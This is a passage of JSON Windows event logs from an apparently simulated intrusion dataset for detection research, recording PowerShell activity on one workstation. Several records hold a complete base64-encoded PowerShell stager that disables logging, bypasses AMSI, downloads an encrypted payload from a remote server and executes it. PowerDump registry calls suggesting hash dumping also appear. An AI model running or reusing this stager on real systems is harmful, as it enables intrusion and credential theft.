{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"Pipeline execution details for command line:                 [PowerDump.Native]::RegCloseKey($hkey) | Out-Null\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=28403\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                [PowerDump.Native]::RegCloseKey($hkey) | Out-Null\n \r\n\r\nDetails: \r\nCommandInvocation(Out-Null): \"Out-Null\"\r\nParameterBinding(Out-Null): name=\"InputObject\"; value=\"0\"\r\n","@timestamp":"2020-09-22T08:22:44.395Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240734,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventReceivedTime":"2020-09-22 04:22:44","EventID":4656,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","ProcessId":"0x704","Opcode":"Info","EventTime":"2020-09-22 04:22:43","TransactionId":"{00000000-0000-0000-0000-000000000000}","ObjectServer":"Security","AccessMask":"0x20019","SourceModuleType":"im_msvistalog","ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@version":"1","OpcodeValue":0,"Severity":"INFO","HandleId":"0x1b8","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework","SourceName":"Microsoft-Windows-Security-Auditing","Category":"Registry","Keywords":-9214364837600034816,"ObjectType":"Key","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":3484,"EventType":"AUDIT_SUCCESS","Message":"A handle to an object was requested.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\r\n\tHandle ID:\t\t0x1b8\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x704\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tQuery key value\r\n\t\t\t\tEnumerate sub-keys\r\n\t\t\t\tNotify about changes to keys\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t\t0x20019\r\n\tPrivileges Used for Access Check:\t-\r\n\tRestricted SID Count:\t0","AccessReason":"-","PrivilegeList":"-","@timestamp":"2020-09-22T08:22:44.395Z","SubjectLogonId":"0x10a7df","port":64545,"RecordNumber":820522,"SubjectUserName":"pgustavo","Task":12801,"SourceModuleName":"eventlog","Version":1,"AccessList":"%%1538\r\n\t\t\t\t%%4432\r\n\t\t\t\t%%4435\r\n\t\t\t\t%%4436\r\n\t\t\t\t","RestrictedSidCount":"0","ResourceAttributes":"-","Hostname":"WORKSTATION5.theshire.local","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":23,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","ProcessGuid":"{b34bc01c-a92a-5f69-7e02-000000000900}","ThreadID":4048,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.396Z","TargetFilename":"C:\\Users\\pgustavo\\AppData\\Local\\Temp\\avdbqyi5\\avdbqyi5.out","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399381,"IsExecutable":"false","Task":23,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","User":"THESHIRE\\pgustavo","Archived":"true","Hashes":"SHA1=B05376E2A3C115B851A803D0CBEF3AB993F42DEE,MD5=15265A21B66E2BE1CDCE7E2863E1079E,SHA256=4303D9A648F789E6837497CB480CD36772A033E6CC21A79E404950C82B345CC2,IMPHASH=00000000000000000000000000000000","SourceName":"Microsoft-Windows-Sysmon","Version":5,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"File Delete (rule: FileDelete)","UtcTime":"2020-09-22 08:22:43.460","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"Pipeline execution details for command line:                 $classVal = New-Object Text.Stringbuilder 1024\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=28405\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                $classVal = New-Object Text.Stringbuilder 1024\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"Text.Stringbuilder\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"1024\"\r\n","@timestamp":"2020-09-22T08:22:44.396Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240735,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x704","ThreadID":3484,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x1b8\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x704\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.397Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820523,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0x1b8","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-2F89-2A856290D601}","UserID":"S-1-5-18","ThreadID":8112,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.397Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":213888,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"Microsoft.CSharp.CSharpCodeProvider\"\r\n","Task":106,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc 